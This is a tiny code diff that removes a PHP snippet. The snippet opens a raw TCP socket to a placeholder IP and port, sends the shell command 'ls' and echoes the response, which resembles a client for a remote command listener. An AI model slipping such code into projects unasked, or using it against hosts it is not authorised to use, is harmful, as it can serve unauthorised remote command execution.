@@ -1,1 +1,0 @@
-$handle = fsockopen("tcp://xxx.xxx.xxx.xxx", 12345);\nfwrite($handle, "ls");\nwhile (!feof($handle)) {\n    $buffer = fread($handle, 4096);\n    echo $buffer;\n}\nfclose($handle);
